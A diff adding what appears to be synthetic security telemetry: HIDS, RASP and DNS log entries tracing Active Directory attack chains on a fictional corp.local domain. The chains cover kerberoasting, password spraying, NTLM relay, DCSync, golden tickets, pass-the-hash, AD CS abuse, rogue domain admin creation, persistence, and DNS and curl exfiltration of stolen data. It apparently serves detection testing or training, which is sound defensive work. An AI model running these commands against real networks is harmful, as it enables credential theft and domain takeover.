@@ -1,0 +1,113 @@
+1. `2026-07-24 07:39:17` **[hids]** `HID0612206`
+    `net user /domain; nltest /dclist:corp.local net.exe net user /domain; nltest /dclist:corp.local <== cmd.exe /c`
+
+1. `2026-07-05 14:31:26` **[hids]** `HID0471872`
+    `SharpHound.exe -c All --zipfilename bh.zip SharpHound.exe SharpHound.exe -c All <== CORP\jdoe`
+2. `2026-07-05 14:35:26` **[hids]** `HID0471892`
+    `Compress-Archive C:\Users\jdoe\bh_*.json -Destination bh.zip powershell.exe Compress-Archive <== CORP\jdoe`
+3. `2026-07-05 14:36:21` **[hids]** `HID0471897`
+    `curl.exe -T bh.zip http://10.20.7.31/up curl.exe curl.exe -T bh.zip http://10.20.7.31/up <== CORP\jdoe`
+
+1. `2026-07-18 05:46:28` **[hids]** `HID0566625`
+    `setspn -T corp.local -Q */* setspn.exe setspn -T corp.local -Q */* <== CORP\jdoe`
+2. `2026-07-18 05:54:18` **[hids]** `HID0566666`
+    `Rubeus.exe kerberoast /outfile:krb.txt /domain:corp.local rubeus.exe Rubeus.exe kerberoast <== CORP\jdoe`
+
+1. `2026-07-11 06:37:49` **[hids]** `HID0514399`
+    `GetNPUsers.py -request -usersfile users.txt -format hashcat -dc-ip 10.20.3.10 corp.local/jdoe python3 GetNPUse`
+
+1. `2026-07-02 22:44:18` **[rasp]** `RASP0461402`
+    `https://app-php-37.ops-corp.com/api/v2/auth/login {"auth_spray": "svc_backup"} Mozilla/5.0 (Windows NT 10.0; W`
+2. `2026-07-02 22:45:54` **[hids]** `HID0451950`
+    `crackmapexec smb 10.20.3.0/24 -u users.txt -p 'Summer2026!' -d corp.local --continue-on-success cme cme crackm`
+
+1. `2026-07-11 22:02:51` **[rasp]** `RASP0530095`
+    `https://app-iis-51.ops-corp.com/EWS/Exchange.asmx {"ntlm_relay": "ldap://10.20.3.10", "push_sub": true} Mozill`
+2. `2026-07-11 22:04:49` **[hids]** `HID0519227`
+    `ntlmrelayx.py -t ldap://10.20.3.10 --escalate-user svc_scan ntlmrelayx.py <== /bin/bash -c`
+3. `2026-07-11 22:08:49` **[hids]** `HID0519247`
+    `secretsdump.py -just-dc-user krbtgt CORP/administrator@dc01.corp.local secretsdump.py <== /bin/bash -c`
+
+1. `2026-07-29 12:22:33` **[hids]** `HID0651176`
+    `lsadump::dcsync /domain:corp.local /user:krbtgt /csv C:\temp\d.csv tk.exe <== CORP\admin <== services.exe`
+2. `2026-07-29 12:26:03` **[hids]** `HID0651195`
+    `powershell -c Resolve-DnsName (gc d.csv|%{$_.Substring(0,48)}) powershell.exe <== CORP\admin`
+3. `2026-07-29 14:50:03` **[dns]** `DNS0634729`
+    `8b9f0a68.qpvzmt-7c41.net A 10.10.41.201`
+4. `2026-07-29 14:51:03` **[dns]** `DNS0634734`
+    `32e133b7.qpvzmt-7c41.net A 192.0.2.148`
+5. `2026-07-29 14:52:18` **[dns]** `DNS0634741`
+    `24400230.qpvzmt-7c41.net A 10.10.42.236`
+
+1. `2026-07-15 13:35:03` **[hids]** `HID0546568`
+    `ntdsutil "ac i ntds" "ifm" "create full C:\ifm" q q ntdsutil.exe ntdsutil <== CORP\admin <== services.exe`
+2. `2026-07-15 18:23:03` **[dns]** `DNS0531891`
+    `044cedc3.nxbsru-91ad.net A 192.0.2.132`
+3. `2026-07-15 18:23:43` **[dns]** `DNS0531895`
+    `d0f72a5c.nxbsru-91ad.net A 10.10.28.230`
+4. `2026-07-15 18:25:18` **[dns]** `DNS0531903`
+    `4d82f127.nxbsru-91ad.net A 10.10.33.54`
+
+1. `2026-07-27 00:36:09` **[hids]** `HID0632500`
+    `kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-3104-512 /krbtgt:4f8a1c9d2b7e6351a0c4de8`
+2. `2026-07-27 00:36:34` **[hids]** `HID0632502`
+    `kerberos::ptt C:\temp\adm.kirbi tk.exe kerberos::ptt C:\temp\adm.kirbi <== cmd.exe /c tk.exe <== services.exe`
+3. `2026-07-27 00:38:54` **[hids]** `HID0632514`
+    `dir \\dc01.corp.local\C$ cmd.exe cmd.exe /c dir \\dc01.corp.local\C$ <== cmd.exe /c dir <== svchost.exe`
+
+1. `2026-07-05 16:30:40` **[hids]** `HID0472493`
+    `kerberos::golden /service:cifs /target:fs01.corp.local /rc4:b7e2d1f4a9c8036e5d2b71c4e8f0a3d6 /ptt tk.exe <== C`
+
+1. `2026-07-20 13:35:09` **[hids]** `HID0584064`
+    `smbclient.py CORP/svc_backup@10.20.3.10 -hashes :8846f7ea2b3c1d5e6f7a8c9d0e1f2a3b python3 smbclient.py <== /bi`
+2. `2026-07-20 13:38:09` **[hids]** `HID0584079`
+    `psexec.py CORP/administrator@dc01.corp.local cmd.exe python3 psexec.py <== /bin/bash -c`
+3. `2026-07-20 13:39:14` **[hids]** `HID0584085`
+    `cmd.exe /c net share; net use \\dc01.corp.local\ADMIN$ cmd.exe cmd.exe /c net share <== CORP\administrator`
+
+1. `2026-07-10 12:32:17` **[hids]** `HID0508746`
+    `SharpGPOAbuse.exe --AddComputerTask --TaskName Corp_Logon --Author CORP\gpo_admin --Command cmd.exe --Argument`
+2. `2026-07-10 12:40:57` **[hids]** `HID0508791`
+    `Set-GPPrefRegistryValue -Name Corp_Logon -Context Domain -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\`
+
+1. `2026-07-29 01:39:02` **[hids]** `HID0647825`
+    `net user svc_sqladd Xr7#pqZ2! /add /domain net.exe net user svc_sqladd /add /domain <== CORP\admin`
+2. `2026-07-29 01:39:47` **[hids]** `HID0647829`
+    `net group "Domain Admins" svc_sqladd /add /domain net.exe net group "Domain Admins" svc_sqladd <== CORP\admin`
+3. `2026-07-29 01:44:47` **[hids]** `HID0647855`
+    `runas /netonly /user:corp.local\svc_sqladd cmd.exe runas.exe runas /netonly /user:corp.local <== CORP\admin`
+
+1. `2026-07-26 08:14:03` **[hids]** `HID0627385`
+    `Rubeus.exe s4u /user:svc_web /rc4:9c1d44b8e2f7a1c6d3b90e5f4a2c7d81 /impersonateuser:Administrator /msdsspn:cif`
+2. `2026-07-26 08:20:33` **[hids]** `HID0627419`
+    `Enter-PSSession -ComputerName dc01.corp.local -Authentication Negotiate <== CORP\Admin`
+
+1. `2026-07-28 21:52:41` **[rasp]** `RASP0660210`
+    `https://app-iis-64.ops-corp.com/certsrv/certfnsh.asp {"adcs_esc1": "template=User"} Mozilla/5.0 (Macintosh; In`
+2. `2026-07-28 21:53:55` **[hids]** `HID0646653`
+    `certipy req -u jdoe@corp.local -ca CORP-CA -template User -upn administrator@corp.local <== /bin/bash -c`
+
+1. `2026-07-26 08:34:35` **[hids]** `HID0627492`
+    `Whisker.exe add /target:dc01$ /domain:corp.local /path:dc01.pfx <== CORP\jdoe`
+2. `2026-07-26 08:37:00` **[hids]** `HID0627505`
+    `certipy auth -pfx dc01.pfx -dc-ip 10.20.3.10 -username DC01$ certipy certipy auth <== /bin/bash -c`
+
+1. `2026-07-28 05:08:42` **[hids]** `HID0641418`
+    `nltest /domain_trusts /all_trusts /v nltest.exe nltest /domain_trusts /all_trusts <== CORP\jdoe`
+2. `2026-07-28 05:15:52` **[hids]** `HID0641455`
+    `net use \\dc02.eu.corp.local\ADMIN$ /user:EU\admin net.exe net use \\dc02.eu.corp.local\ADMIN$ <== CORP\admin`
+
+1. `2026-07-21 17:22:03` **[hids]** `HID0592744`
+    `findstr /S /I cpassword \\dc01.corp.local\SYSVOL\corp.local\Policies\*.xml cmd.exe <== CORP\jdoe`
+
+1. `2026-07-25 16:46:28` **[hids]** `HID0622555`
+    `quser /server:dc01.corp.local quser.exe quser /server:dc01.corp.local <== CORP\jdoe`
+2. `2026-07-25 16:50:48` **[hids]** `HID0622577`
+    `Invoke-TokenManipulation -ImpersonateUser -Username CORP\adm_domain <== CORP\jdoe`
+
+1. `2026-07-05 03:17:56` **[hids]** `HID0468364`
+    `ntdsutil "set dsrm password" "reset password on server null" q q ntdsutil.exe ntdsutil <== CORP\admin`
+2. `2026-07-05 03:19:21` **[hids]** `HID0468372`
+    `reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /d 2 /f reg.exe <== CORP\admin`
+3. `2026-07-05 03:22:31` **[hids]** `HID0468388`
+    `dsacls "CN=AdminSDHolder,CN=System,DC=corp,DC=local" /G CORP\svc_scan:GA dsacls.exe <== CORP\admin`
